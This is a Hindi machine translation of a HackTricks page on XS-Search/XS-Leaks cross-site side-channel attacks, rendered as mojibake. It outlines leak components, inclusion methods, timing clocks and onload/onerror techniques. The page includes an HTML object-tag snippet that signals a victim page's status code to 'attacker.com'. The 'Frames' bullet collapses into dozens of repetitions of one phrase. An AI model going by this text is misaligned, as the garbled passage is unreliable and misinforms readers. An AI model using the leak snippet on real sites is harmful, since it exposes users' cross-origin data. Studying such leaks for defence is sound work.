# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[****](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд┐рд╢реНрд╡ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣** рдмрдирд╛рдПрдВ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

XS-Search рдПрдХ рд╡рд┐рдзрд┐ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕рд╛рдЗрдб рдЪреИрдирд▓ рд╡рдВрд╢рд╛рдВрдХрди** рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕ рд╣рдорд▓реЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдореБрдЦреНрдп рдШрдЯрдХ рд╣реИрдВ:

* **рд╡рдВрд╢рд╛рдВрдХрдиреАрдп рд╡реЗрдм**: рдЬрд┐рд╕рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХрд╛ рдЗрд░рд╛рджрд╛ рд╣реИред
* **рд╣рдорд▓рд╛рд╡рд░ рдХреА рд╡реЗрдм**: рдЕрдЯреИрдХрд░ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рд╡реЗрдмрд╕рд╛рдЗрдЯ, рдЬрд┐рд╕реЗ рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ рджреЗрдЦрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЙрддреНрдкреАрдбрд╝рди рд╣реЛрддрд╛ рд╣реИред
* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐**: рд╡рдВрд╢рд╛рдВрдХрдиреАрдп рд╡реЗрдм рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреА рд╡реЗрдм рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдирд╛рдИ рдЧрдИ рддрдХрдиреАрдХ (рдЬреИрд╕реЗ window.open, iframe, fetch, href рдХреЗ рд╕рд╛рде HTML рдЯреИрдЧ рдЖрджрд┐)ред
* **рд▓реАрдХ рддрдХрдиреАрдХ**: рдЬреЛ рддрдХрдиреАрдХреЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ рдЬреЛ рд╡рдВрд╢рд╛рдВрдХрдиреАрдп рд╡реЗрдм рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЕрдВрддрд░ рдХреЛ рдЬрд╛рдирдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреА рд╣реИред
* **рд╕реНрдерд┐рддрд┐рдпрд╛рдБ**: рдЬрд┐рди рджреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд╣рд╛рд▓рд╛рддреЛрдВ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИред
* **рдкрд╣рдЪрд╛рдирдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╡рдВрд╢рд╛рдВрдХрдиреАрдп рд╡реЗрдм рдХреА рд╕реНрдерд┐рддрд┐ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╡рд┐рднрд┐рдиреНрди рдкрд░рд┐рд╡рд░реНрддрдиред

### рдкрд╣рдЪрд╛рдирдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░

рд╡рдВрд╢рд╛рдВрдХрдиреАрдп рд╡реЗрдм рдХреА рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЛ рднрд┐рдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдкрд╣рд▓реВ рд╡рд┐рд╢реНрд▓реЗрд╖рд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

* **рд╕реНрдерд┐рддрд┐ рдХреЛрдб**: рд╡рд┐рднрд┐рдиреНрди HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХреЗ рдмреАрдЪ рднреЗрдж рдХрд░рдирд╛, рдЬреИрд╕реЗ рд╕рд░реНрд╡рд░ рддреНрд░реБрдЯрд┐рдпрд╛рдБ, рдЧреНрд░рд╛рд╣рдХ рддреНрд░реБрдЯрд┐рдпрд╛рдБ, рдпрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рддреНрд░реБрдЯрд┐рдпрд╛рдБред
* **API рдЙрдкрдпреЛрдЧ**: рдкреГрд╖реНрдареЛрдВ рдХреЗ рдмреАрдЪ **Web APIs рдХрд╛ рдЙрдкрдпреЛрдЧ** рдкрд╣рдЪрд╛рдирдирд╛, рдЬреЛ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рд╡рдВрд╢рд╛рдВрдХрдиреАрдп рдкреГрд╖реНрда рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ JavaScript Web API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
* **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреНрд╕**: рд╡рд┐рднрд┐рдиреНрди рдкреГрд╖реНрдареЛрдВ рдкрд░ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛, рдХреЗрд╡рд▓ HTTP рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реА рдирд╣реАрдВ, рдмрд▓реНрдХрд┐ рдЬреЛ JavaScript рдпрд╛ HTML рджреНрд╡рд╛рд░рд╛ рдкреНрд░реЗрд░рд┐рдд рдХрд┐рдП рдЧрдП рд╣реЛрдВред
* **рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА**: HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╢рд░реАрд░ рдпрд╛ рдкреГрд╖реНрда рдЙрдкрд╕рд╛рдзрдиреЛрдВ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЛ рджреЗрдЦрдирд╛, рдЬреИрд╕реЗ **рдПрдореНрдмреЗрдбреЗрдб рдлреНрд░реЗрдореНрд╕** рдХреА рд╕рдВрдЦреНрдпрд╛ рдпрд╛ рдЫрд╡рд┐рдпреЛрдВ рдореЗрдВ рдЖрдХрд╛рд░ рдЕрдВрддрд░ред
* **HTTP рд╣реЗрдбрд░**: рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░ рдХреА рдореМрдЬреВрджрдЧреА рдпрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рдореВрд▓реНрдп рдХрд╛ рдзреНрдпрд╛рди рджреЗрдирд╛, рдЬрд┐рд╕рдореЗрдВ X-Frame-Options, Content-Disposition, рдФрд░ Cross-Origin-Resource-Policy рдЬреИрд╕реЗ рд╣реЗрдбрд░ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред
* **рд╕рдордп**: рджреЛ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рдмреАрдЪ рд╕реНрдерд┐рд░ рд╕рдордп рдЕрдВрддрд░реЛрдВ рдХрд╛ рдзреНрдпрд╛рди рджреЗрдирд╛ред

### рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ

* **HTML рддрддреНрд╡**: HTML рд╡рд┐рднрд┐рдиреНрди рддрддреНрд╡ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ **рд╡рдВрд╢рд╛рдВрдХрдиреАрдп рд╕рдВрд╕рд╛рдзрди рд╕рдорд╛рд╡реЗрд╢** рдХреЗ рд▓рд┐рдП рд╣реИрдВ, рдЬреИрд╕реЗ рд╕реНрдЯрд╛рдЗрд▓рд╢реАрдЯ, рдЫрд╡рд┐рдпрд╛рдБ, рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ, рдЬреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдПрдХ рдЧреИрд░-HTML рд╕рдВрд╕рд╛рдзрди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд HTML рддрддреНрд╡реЛрдВ рдХрд╛ рд╕рдВрдЧреНрд░рд╣ [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реИред
* **рдлреНрд░реЗрдореНрд╕**: рддрддреНрд╡ рдЬреИрд╕реЗ **iframe**, **object**, рдФрд░ **embed** рд╕реАрдзреЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкреГрд╖реНрда рдореЗрдВ HTML рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╕рдорд╛рд╣рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдкреГрд╖реНрда рдореЗрдВ **рдлреНрд░реЗрдорд┐рдВрдЧ рд╕реБрд░рдХреНрд╖рд╛ рдХреА рдХрдореА** рд╣реИ, рддреЛ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдлреНрд░реЗрдорд┐рдВрдЧ рд╕рдВрд░рдЪрдирд╛ рдХреЗ
## **рд╕рдордп рдЖрдзрд╛рд░рд┐рдд рддрдХрдиреАрдХреЗрдВ**

рдХреБрдЫ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХреЛрдВ рдореЗрдВ рд╕рдордп рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡реЗрдм рдкреГрд╖реНрдареЛрдВ рдХреА рд╕рдВрднрд╛рд╡рд┐рдд рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЕрдВрддрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рд╕рдордп рдХреЛ рдорд╛рдкрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВред

**рдШрдбрд╝рд┐рдпрд╛рд▓**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API рдбреЗрд╡рд▓рдкрд░реНрд╕ рдХреЛ рдЙрдЪреНрдЪ-рд╕рдВрдХрд▓реНрдк рд╕рдордпрд╛рдВрдХрди рдорд╛рдкреЛрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред\
рд╣рдорд▓рд╛рд╡рд╛рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░рдВрддрд░ рдШрдбрд╝рд┐рдпрд╛рд▓ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрдИ API: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS рдПрдиреАрдореЗрд╢рди рдФрд░ рдЕрдиреНрдпред\
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## рдШрдЯрдирд╛ рд╣реИрдВрдбрд▓рд░ рддрдХрдиреАрдХреЗрдВ

### Onload/Onerror

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдо, HTML рддрддреНрд╡
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╕реНрдерд┐рддрд┐ рдХреЛрдб
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **рд╕рд╛рд░рд╛рдВрд╢**: рдпрджрд┐ рдХрд┐рд╕реА рд╕рдВрд╕рд╛рдзрди рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ onerror/onload рдШрдЯрдирд╛рдПрдВ рд╕рдВрд╕рд╛рдзрди рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ/рдЕрд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд▓реЛрдб рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

рдХреЛрдб рдЙрджрд╛рд╣рд░рдг рдХреЛ **JS рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢** рдХреА рдЧрдИ рд╣реИ, рд▓реЗрдХрд┐рди **рдЕрдиреНрдп рдЯреИрдЧ** рдЬреИрд╕реЗ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕, рд╕реНрдЯрд╛рдЗрд▓рд╢реАрдЯреНрд╕, рдЗрдореЗрдЬреЗрд╕, рдСрдбрд┐рдпреЛ рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдЯреИрдЧ рдХреЛ рд╕реАрдзреЗ** рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдП рдФрд░ рдЯреИрдЧ рдХреЗ рдЕрдВрджрд░ `onload` рдФрд░ `onerror` рдШрдЯрдирд╛рдПрдВ рдШреЛрд╖рд┐рдд рдХреА рдЬрд╛рдПрдВ (JS рд╕реЗ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп)ред

рдЗрд╕ рд╣рдорд▓реЗ рдХрд╛ рднреА рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ-рд░рд╣рд┐рдд рд╕рдВрд╕реНрдХрд░рдг рд╣реИ:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЕрдЧрд░ `example.com/404` рдирд╣реАрдВ рдорд┐рд▓рддрд╛ рд╣реИ рддреЛ `attacker.com/?error` рд▓реЛрдб рд╣реЛрдЧрд╛ред

### Onload рдЯрд╛рдЗрдорд┐рдВрдЧ

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: HTML рддрддреНрд╡
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╕рдордп (рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА, рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХреЗ рдХрд╛рд░рдг)
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
